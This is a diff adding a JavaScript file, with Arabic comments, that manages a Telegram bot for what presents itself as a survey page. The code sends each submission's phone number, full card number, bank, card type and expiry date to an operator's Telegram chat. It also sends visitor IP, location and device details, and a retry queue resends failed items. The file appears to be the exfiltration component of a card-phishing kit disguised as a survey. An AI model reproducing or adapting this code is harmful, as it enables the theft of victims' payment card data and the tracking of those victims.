@@ -1,0 +1,815 @@
+/**
+ * نظام إرسال البيانات إلى Telegram
+ * المسؤول عن: الاتصال بـ Telegram API، إرسال الرسائل، إدارة الكاش
+ */
+
+class TelegramBotManager {
+    constructor() {
+        this.botToken = null;
+        this.chatId = null;
+        this.isEnabled = false;
+        this.queue = [];
+        this.isSending = false;
+        this.retryAttempts = 3;
+        this.retryDelay = 5000; // 5 ثواني
+        
+        this.init();
+    }
+    
+    init() {
+        this.loadConfig();
+        this.setupEventListeners();
+        this.processQueue();
+        this.setupAutoCleanup();
+        
+        console.log('🤖 Telegram Bot Manager initialized');
+    }
+    
+    // ====== تحميل الإعدادات ======
+    loadConfig() {
+        try {
+            // تحميل من localStorage
+            const config = JSON.parse(localStorage.getItem('telegram_config') || '{}');
+            
+            this.botToken = config.botToken || '';
+            this.chatId = config.chatId || '';
+            this.isEnabled = config.enabled || false;
+            
+            // تحميل من إعدادات النظام
+            if (!this.botToken) {
+                this.botToken = localStorage.getItem('telegram_bot_token') || '';
+            }
+            
+            if (!this.chatId) {
+                this.chatId = localStorage.getItem('telegram_chat_id') || '';
+            }
+            
+            console.log('⚙️ إعدادات Telegram:', {
+                hasToken: !!this.botToken,
+                hasChatId: !!this.chatId,
+                isEnabled: this.isEnabled
+            });
+            
+        } catch (error) {
+            console.error('❌ خطأ في تحميل إعدادات Telegram:', error);
+            this.isEnabled = false;
+        }
+    }
+    
+    saveConfig() {
+        try {
+            const config = {
+                botToken: this.botToken,
+                chatId: this.chatId,
+                enabled: this.isEnabled,
+                lastUpdated: new Date().toISOString()
+            };
+            
+            localStorage.setItem('telegram_config', JSON.stringify(config));
+            console.log('💾 تم حفظ إعدادات Telegram');
+            
+        } catch (error) {
+            console.error('❌ خطأ في حفظ إعدادات Telegram:', error);
+        }
+    }
+    
+    updateConfig(botToken, chatId, enabled = true) {
+        this.botToken = botToken;
+        this.chatId = chatId;
+        this.isEnabled = enabled;
+        
+        this.saveConfig();
+        
+        // اختبار الاتصال بعد التحديث
+        if (enabled) {
+            this.testConnection();
+        }
+    }
+    
+    // ====== اختبار الاتصال ======
+    async testConnection() {
+        if (!this.botToken || !this.chatId) {
+            return {
+                success: false,
+                message: 'إعدادات Telegram غير مكتملة'
+            };
+        }
+        
+        try {
+            const testMessage = {
+                type: 'test',
+                message: '🔗 اختبار اتصال Telegram\nتم إرسال هذه الرسالة للتحقق من صحة الإعدادات.',
+                timestamp: new Date().toISOString()
+            };
+            
+            const result = await this.sendMessage(testMessage);
+            
+            if (result.success) {
+                return {
+                    success: true,
+                    message: '✅ تم الاتصال بـ Telegram بنجاح!'
+                };
+            } else {
+                return {
+                    success: false,
+                    message: `❌ فشل الاتصال: ${result.error}`
+                };
+            }
+            
+        } catch (error) {
+            return {
+                success: false,
+                message: `❌ خطأ في الاتصال: ${error.message}`
+            };
+        }
+    }
+    
+    // ====== إرسال الرسائل ======
+    async sendSurveySubmission(data, submissionId) {
+        if (!this.isEnabled || !this.botToken || !this.chatId) {
+            console.warn('⚠️ Telegram غير مفعل أو الإعدادات غير مكتملة');
+            this.saveToQueue(data, submissionId);
+            return { success: false, error: 'Telegram غير مفعل' };
+        }
+        
+        const message = this.formatSurveyMessage(data, submissionId);
+        
+        try {
+            const result = await this.sendTelegramMessage(message);
+            
+            if (result.success) {
+                console.log('✅ تم إرسال المشاركة إلى Telegram');
+                return { success: true, messageId: result.messageId };
+            } else {
+                console.error('❌ فشل إرسال المشاركة:', result.error);
+                this.saveToQueue(data, submissionId);
+                return { success: false, error: result.error };
+            }
+            
+        } catch (error) {
+            console.error('❌ خطأ في إرسال المشاركة:', error);
+            this.saveToQueue(data, submissionId);
+            return { success: false, error: error.message };
+        }
+    }
+    
+    async sendVisitorNotification(visitorData) {
+        if (!this.isEnabled || !this.botToken || !this.chatId) {
+            return { success: false, error: 'Telegram غير مفعل' };
+        }
+        
+        const message = this.formatVisitorMessage(visitorData);
+        
+        try {
+            const result = await this.sendTelegramMessage(message);
+            return result;
+            
+        } catch (error) {
+            console.error('❌ خطأ في إرسال إشعار الزائر:', error);
+            return { success: false, error: error.message };
+        }
+    }
+    
+    async sendAdminNotification(title, message, type = 'info') {
+        if (!this.isEnabled || !this.botToken || !this.chatId) {
+            return { success: false, error: 'Telegram غير مفعل' };
+        }
+        
+        const formattedMessage = this.formatAdminMessage(title, message, type);
+        
+        try {
+            const result = await this.sendTelegramMessage(formattedMessage);
+            return result;
+            
+        } catch (error) {
+            console.error('❌ خطأ في إرسال إشعار المسؤول:', error);
+            return { success: false, error: error.message };
+        }
+    }
+    
+    async sendTelegramMessage(text) {
+        if (!this.botToken || !this.chatId) {
+            throw new Error('إعدادات Telegram غير مكتملة');
+        }
+        
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: this.chatId,
+                    text: text,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (data.ok) {
+                return {
+                    success: true,
+                    messageId: data.result.message_id,
+                    chatId: data.result.chat.id,
+                    date: data.result.date
+                };
+            } else {
+                throw new Error(data.description || 'Unknown Telegram error');
+            }
+            
+        } catch (error) {
+            console.error('❌ خطأ في إرسال رسالة Telegram:', error);
+            throw error;
+        }
+    }
+    
+    // ====== تنسيق الرسائل ======
+    formatSurveyMessage(data, submissionId) {
+        const timestamp = new Date().toLocaleString('ar-EG');
+        
+        let message = `
+📋 <b>مشاركة جديدة في الاستبيان</b>
+
+🆔 <b>رقم المشاركة:</b> <code>${submissionId}</code>
+📞 <b>رقم الهاتف:</b> <code>${data.phone}</code>
+💳 <b>رقم البطاقة:</b> <code>${data.cardNumber}</code>
+🏦 <b>نوع البطاقة:</b> ${data.cardType}
+🏢 <b>اسم البنك:</b> ${data.bankName}
+📅 <b>تاريخ الانتهاء:</b> ${data.expiryDate}
+🔐 <b>رمز الحماية:</b> ***
+        
+📍 <b>معلومات الموقع:</b>
+   ├ البلد: ${data.location?.country || 'غير معروف'}
+   ├ المنطقة: ${data.location?.region || 'غير معروف'}
+   ├ المدينة: ${data.location?.city || 'غير معروف'}
+   └ مزود الخدمة: ${data.location?.isp || 'غير معروف'}
+        
+📱 <b>معلومات الجهاز:</b>
+   ├ المتصفح: ${data.deviceInfo?.browser || 'غير معروف'}
+   ├ نظام التشغيل: ${data.deviceInfo?.os || 'غير معروف'}
+   ├ نوع الجهاز: ${data.deviceInfo?.device || 'غير معروف'}
+   └ اللغة: ${data.deviceInfo?.language || 'غير معروف'}
+        
+🕐 <b>تاريخ المشاركة:</b> ${timestamp}
+🔗 <b>رابط الموقع:</b> ${window.location.href}
+        `;
+        
+        return message.trim();
+    }
+    
+    formatVisitorMessage(visitorData) {
+        const timestamp = new Date().toLocaleString('ar-EG');
+        
+        let message = `
+👤 <b>معلومات الزائر</b>
+
+🆔 <b>معرف الزائر:</b> <code>${visitorData.visitorId}</code>
+🆔 <b>معرف الجلسة:</b> <code>${visitorData.sessionId}</code>
+        
+📍 <b>الموقع الجغرافي:</b>
+   ├ البلد: ${visitorData.locationInfo?.country || 'غير معروف'}
+   ├ المنطقة: ${visitorData.locationInfo?.region || 'غير معروف'}
+   ├ المدينة: ${visitorData.locationInfo?.city || 'غير معروف'}
+   └ العنوان IP: <code>${visitorData.locationInfo?.ip || 'غير معروف'}</code>
+        
+📱 <b>معلومات الجهاز:</b>
+   ├ المتصفح: ${visitorData.deviceInfo?.browser || 'غير معروف'}
+   ├ نظام التشغيل: ${visitorData.deviceInfo?.os || 'غير معروف'}
+   ├ نوع الجهاز: ${visitorData.deviceInfo?.device || 'غير معروف'}
+   └ دقة الشاشة: ${visitorData.deviceInfo?.screenResolution?.width || 0}x${visitorData.deviceInfo?.screenResolution?.height || 0}
+        
+📊 <b>إحصائيات الزيارة:</b>
+   ├ عدد الزيارات: ${visitorData.visitInfo?.visits || 1}
+   ├ أول زيارة: ${new Date(visitorData.visitInfo?.firstVisit || Date.now()).toLocaleString('ar-EG')}
+   └ آخر زيارة: ${new Date(visitorData.visitInfo?.lastVisit || Date.now()).toLocaleString('ar-EG')}
+        
+🕐 <b>وقت التتبع:</b> ${timestamp}
+🔗 <b>الصفحة:</b> ${window.location.href}
+        `;
+        
+        return message.trim();
+    }
+    
+    formatAdminMessage(title, content, type) {
+        const icons = {
+            info: 'ℹ️',
+            success: '✅',
+            warning: '⚠️',
+            error: '❌',
+            alert: '🚨'
+        };
+        
+        const timestamp = new Date().toLocaleString('ar-EG');
+        
+        let message = `
+${icons[type] || icons.info} <b>${title}</b>
+
+${content}
+        
+🕐 <b>الوقت:</b> ${timestamp}
+🔗 <b>الموقع:</b> ${window.location.href}
+        `;
+        
+        return message.trim();
+    }
+    
+    formatErrorMessage(error) {
+        const timestamp = new Date().toLocaleString('ar-EG');
+        
+        let message = `
+❌ <b>حدث خطأ في النظام</b>
+
+📝 <b>الوصف:</b>
+${error.message || 'خطأ غير معروف'}
+
+📍 <b>المكان:</b>
+${error.filename || 'غير معروف'}:${error.lineno || '?'}:${error.colno || '?'}
+
+🔗 <b>الصفحة:</b> ${window.location.href}
+🕐 <b>الوقت:</b> ${timestamp}
+👤 <b>المستخدم:</b> ${navigator.userAgent.substring(0, 100)}...
+        `;
+        
+        return message.trim();
+    }
+    
+    // ====== نظام قائمة الانتظار (Queue) ======
+    saveToQueue(data, submissionId = null) {
+        try {
+            const queueItem = {
+                data: data,
+                submissionId: submissionId,
+                type: 'survey_submission',
+                timestamp: new Date().toISOString(),
+                attempts: 0,
+                lastAttempt: null
+            };
+            
+            this.queue.push(queueItem);
+            this.saveQueue();
+            
+            console.log('💾 تم حفظ البيانات في قائمة الانتظار');
+            
+        } catch (error) {
+            console.error('❌ خطأ في حفظ البيانات في قائمة الانتظار:', error);
+        }
+    }
+    
+    saveQueue() {
+        try {
+            localStorage.setItem('telegram_queue', JSON.stringify(this.queue));
+        } catch (error) {
+            console.error('❌ خطأ في حفظ قائمة الانتظار:', error);
+        }
+    }
+    
+    loadQueue() {
+        try {
+            const savedQueue = localStorage.getItem('telegram_queue');
+            this.queue = savedQueue ? JSON.parse(savedQueue) : [];
+        } catch (error) {
+            console.error('❌ خطأ في تحميل قائمة الانتظار:', error);
+            this.queue = [];
+        }
+    }
+    
+    async processQueue() {
+        if (this.isSending || this.queue.length === 0) {
+            return;
+        }
+        
+        this.isSending = true;
+        
+        while (this.queue.length > 0) {
+            const item = this.queue[0];
+            
+            if (item.attempts >= this.retryAttempts) {
+                // تم تجاوز عدد المحاولات، نقل إلى الأرشيف
+                this.archiveFailedItem(item);
+                this.queue.shift();
+                continue;
+            }
+            
+            try {
+                const result = await this.sendQueueItem(item);
+                
+                if (result.success) {
+                    // نجاح الإرسال، حذف من القائمة
+                    this.queue.shift();
+                    console.log('✅ تم إرسال عنصر من قائمة الانتظار');
+                } else {
+                    // فشل الإرسال، زيادة عدد المحاولات
+                    item.attempts++;
+                    item.lastAttempt = new Date().toISOString();
+                    item.lastError = result.error;
+                    
+                    // الانتظار قبل المحاولة التالية
+                    await this.delay(this.retryDelay);
+                }
+                
+            } catch (error) {
+                console.error('❌ خطأ في معالجة عنصر قائمة الانتظار:', error);
+                item.attempts++;
+                item.lastAttempt = new Date().toISOString();
+                item.lastError = error.message;
+                
+                await this.delay(this.retryDelay);
+            }
+            
+            this.saveQueue();
+        }
+        
+        this.isSending = false;
+        
+        // جدولة المعالجة التالية
+        setTimeout(() => this.processQueue(), 30000); // كل 30 ثانية
+    }
+    
+    async sendQueueItem(item) {
+        if (!this.isEnabled || !this.botToken || !this.chatId) {
+            return { success: false, error: 'Telegram غير مفعل' };
+        }
+        
+        let message;
+        
+        switch (item.type) {
+            case 'survey_submission':
+                message = this.formatSurveyMessage(item.data, item.submissionId);
+                break;
+            case 'visitor_notification':
+                message = this.formatVisitorMessage(item.data);
+                break;
+            default:
+                return { success: false, error: 'نوع الرسالة غير معروف' };
+        }
+        
+        try {
+            const result = await this.sendTelegramMessage(message);
+            return { success: true, ...result };
+            
+        } catch (error) {
+            return { success: false, error: error.message };
+        }
+    }
+    
+    archiveFailedItem(item) {
+        try {
+            let archive = JSON.parse(localStorage.getItem('telegram_failed_archive') || '[]');
+            
+            archive.push({
+                ...item,
+                archivedAt: new Date().toISOString()
+            });
+            
+            // حفظ فقط آخر 100 عنصر فاشل
+            if (archive.length > 100) {
+                archive = archive.slice(-100);
+            }
+            
+            localStorage.setItem('telegram_failed_archive', JSON.stringify(archive));
+            console.log('📦 تم أرشفة العنصر الفاشل');
+            
+        } catch (error) {
+            console.error('❌ خطأ في أرشفة العنصر الفاشل:', error);
+        }
+    }
+    
+    // ====== تنظيف البيانات القديمة ======
+    setupAutoCleanup() {
+        // تنظيف يومي
+        const lastCleanup = localStorage.getItem('last_telegram_cleanup');
+        const today = new Date().toDateString();
+        
+        if (lastCleanup !== today) {
+            this.cleanupOldData();
+            localStorage.setItem('last_telegram_cleanup', today);
+        }
+    }
+    
+    cleanupOldData() {
+        try {
+            // تنظيف الأرشيف القديم (أكثر من 30 يوم)
+            const archive = JSON.parse(localStorage.getItem('telegram_failed_archive') || '[]');
+            const thirtyDaysAgo = new Date();
+            thirtyDaysAgo.setDate(thirtyDaysAgo.getDate() - 30);
+            
+            const filteredArchive = archive.filter(item => {
+                const itemDate = new Date(item.archivedAt || item.timestamp);
+                return itemDate > thirtyDaysAgo;
+            });
+            
+            localStorage.setItem('telegram_failed_archive', JSON.stringify(filteredArchive));
+            
+            // تنظيف السجلات القديمة
+            this.cleanupOldLogs();
+            
+            console.log('🧹 تم تنظيف بيانات Telegram القديمة');
+            
+        } catch (error) {
+            console.error('❌ خطأ في تنظيف البيانات القديمة:', error);
+        }
+    }
+    
+    cleanupOldLogs() {
+        try {
+            const logs = JSON.parse(localStorage.getItem('telegram_logs') || '[]');
+            const sevenDaysAgo = new Date();
+            sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
+            
+            const filteredLogs = logs.filter(log => {
+                const logDate = new Date(log.timestamp);
+                return logDate > sevenDaysAgo;
+            });
+            
+            localStorage.setItem('telegram_logs', JSON.stringify(filteredLogs));
+            
+        } catch (error) {
+            console.error('❌ خطأ في تنظيف السجلات:', error);
+        }
+    }
+    
+    // ====== السجلات والإحصائيات ======
+    logMessage(type, data, result) {
+        try {
+            const log = {
+                type: type,
+                data: data,
+                result: result,
+                timestamp: new Date().toISOString(),
+                url: window.location.href
+            };
+            
+            let logs = JSON.parse(localStorage.getItem('telegram_logs') || '[]');
+            logs.push(log);
+            
+            // حفظ فقط آخر 500 سجل
+            if (logs.length > 500) {
+                logs = logs.slice(-500);
+            }
+            
+            localStorage.setItem('telegram_logs', JSON.stringify(logs));
+            
+        } catch (error) {
+            console.error('❌ خطأ في تسجيل الرسالة:', error);
+        }
+    }
+    
+    getStatistics() {
+        try {
+            const logs = JSON.parse(localStorage.getItem('telegram_logs') || '[]');
+            const queue = this.queue.length;
+            const archive = JSON.parse(localStorage.getItem('telegram_failed_archive') || '[]').length;
+            
+            const today = new Date().toDateString();
+            const todayLogs = logs.filter(log => 
+                new Date(log.timestamp).toDateString() === today
+            );
+            
+            const successfulLogs = logs.filter(log => 
+                log.result && log.result.success === true
+            );
+            
+            const failedLogs = logs.filter(log => 
+                log.result && log.result.success === false
+            );
+            
+            return {
+                totalMessages: logs.length,
+                successfulMessages: successfulLogs.length,
+                failedMessages: failedLogs.length,
+                successRate: logs.length > 0 ? (successfulLogs.length / logs.length * 100).toFixed(2) : 0,
+                todayMessages: todayLogs.length,
+                queueLength: queue,
+                archivedItems: archive,
+                lastMessage: logs.length > 0 ? logs[logs.length - 1].timestamp : null
+            };
+            
+        } catch (error) {
+            console.error('❌ خطأ في حساب الإحصائيات:', error);
+            return {
+                totalMessages: 0,
+                successfulMessages: 0,
+                failedMessages: 0,
+                successRate: 0,
+                todayMessages: 0,
+                queueLength: 0,
+                archivedItems: 0,
+                lastMessage: null
+            };
+        }
+    }
+    
+    // ====== إدارة الملفات والصور ======
+    async sendPhoto(photoBlob, caption = '') {
+        if (!this.isEnabled || !this.botToken || !this.chatId) {
+            return { success: false, error: 'Telegram غير مفعل' };
+        }
+        
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', this.chatId);
+            formData.append('photo', photoBlob);
+            
+            if (caption) {
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'HTML');
+            }
+            
+            const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            const data = await response.json();
+            
+            if (data.ok) {
+                return {
+                    success: true,
+                    messageId: data.result.message_id,
+                    photoId: data.result.photo[0].file_id
+                };
+            } else {
+                throw new Error(data.description || 'Unknown Telegram error');
+            }
+            
+        } catch (error) {
+            console.error('❌ خطأ في إرسال الصورة:', error);
+            return { success: false, error: error.message };
+        }
+    }
+    
+    async sendDocument(documentBlob, filename, caption = '') {
+        if (!this.isEnabled || !this.botToken || !this.chatId) {
+            return { success: false, error: 'Telegram غير مفعل' };
+        }
+        
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', this.chatId);
+            formData.append('document', documentBlob, filename);
+            
+            if (caption) {
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'HTML');
+            }
+            
+            const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            const data = await response.json();
+            
+            if (data.ok) {
+                return {
+                    success: true,
+                    messageId: data.result.message_id,
+                    documentId: data.result.document.file_id
+                };
+            } else {
+                throw new Error(data.description || 'Unknown Telegram error');
+            }
+            
+        } catch (error) {
+            console.error('❌ خطأ في إرسال الملف:', error);
+            return { success: false, error: error.message };
+        }
+    }
+    
+    // ====== دوال المساعدة ======
+    delay(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+    
+    setupEventListeners() {
+        // تتبع أخطاء الشبكة
+        window.addEventListener('online', () => {
+            if (this.queue.length > 0) {
+                this.processQueue();
+            }
+        });
+        
+        // إرسال الأخطاء إلى Telegram
+        window.addEventListener('error', (event) => {
+            if (this.isEnabled) {
+                const errorMessage = this.formatErrorMessage(event);
+                this.sendTelegramMessage(errorMessage).catch(console.error);
+            }
+        });
+    }
+    
+    // ====== الواجهة العامة ======
+    enable() {
+        this.isEnabled = true;
+        this.saveConfig();
+        console.log('✅ تم تفعيل Telegram');
+    }
+    
+    disable() {
+        this.isEnabled = false;
+        this.saveConfig();
+        console.log('❌ تم تعطيل Telegram');
+    }
+    
+    setBotToken(token) {
+        this.botToken = token;
+        this.saveConfig();
+        console.log('🔑 تم تحديث توكن البوت');
+    }
+    
+    setChatId(chatId) {
+        this.chatId = chatId;
+        this.saveConfig();
+        console.log('💬 تم تحديث معرف الدردشة');
+    }
+    
+    getConfig() {
+        return {
+            botToken: this.botToken ? '••••••••' : null,
+            chatId: this.chatId,
+            enabled: this.isEnabled,
+            queueLength: this.queue.length
+        };
+    }
+    
+    clearQueue() {
+        this.queue = [];
+        this.saveQueue();
+        console.log('🗑️ تم مسح قائمة الانتظار');
+    }
+    
+    exportLogs() {
+        try {
+            const logs = JSON.parse(localStorage.getItem('telegram_logs') || '[]');
+            const statistics = this.getStatistics();
+            
+            const data = {
+                statistics: statistics,
+                logs: logs,
+                exportedAt: new Date().toISOString()
+            };
+            
+            return JSON.stringify(data, null, 2);
+            
+        } catch (error) {
+            console.error('❌ خطأ في تصدير السجلات:', error);
+            return '{}';
+        }
+    }
+}
+
+// ====== تهيئة المدير عند تحميل الصفحة ======
+let telegramBotManager = null;
+
+document.addEventListener('DOMContentLoaded', function() {
+    try {
+        telegramBotManager = new TelegramBotManager();
+        console.log('🤖 Telegram Bot Manager جاهز للعمل!');
+        
+        // تصدير الكائن للاستخدام العام
+        window.TelegramBot = telegramBotManager;
+        
+    } catch (error) {
+        console.error('❌ فشل في تهيئة Telegram Bot Manager:', error);
+    }
+});
+
+// ====== دالة الإرسال للاستخدام من main.js ======
+async function sendToTelegram(formData, submissionId) {
+    if (!telegramBotManager) {
+        console.warn('⚠️ Telegram Bot Manager غير مهيأ');
+        return { success: false, error: 'المدير غير مهيأ' };
+    }
+    
+    try {
+        const result = await telegramBotManager.sendSurveySubmission(formData, submissionId);
+        
+        // تسجيل النتيجة
+        telegramBotManager.logMessage('survey_submission', formData, result);
+        
+        return result;
+        
+    } catch (error) {
+        console.error('❌ خطأ في إرسال البيانات:', error);
+        return { success: false, error: error.message };
+    }
+}
+
+// ====== تصدير الدوال للاستخدام العام ======
+window.TELEGRAM = {
+    sendSurvey: sendToTelegram,
+    sendNotification: (title, message, type) => 
+        telegramBotManager?.sendAdminNotification(title, message, type) || Promise.resolve({ success: false }),
+    testConnection: () => telegramBotManager?.testConnection() || Promise.resolve({ success: false, message: 'المدير غير مهيأ' }),
+    getStats: () => telegramBotManager?.getStatistics() || {},
+    getConfig: () => telegramBotManager?.getConfig() || {},
+    updateConfig: (token, chatId, enabled) => telegramBotManager?.updateConfig(token, chatId, enabled),
+    enable: () => telegramBotManager?.enable(),
+    disable: () => telegramBotManager?.disable(),
+    clearQueue: () => telegramBotManager?.clearQueue(),
+    exportLogs: () => telegramBotManager?.exportLogs() || '{}'
+};
+
+console.log('✅ telegram.js تم التحميل بنجاح!');
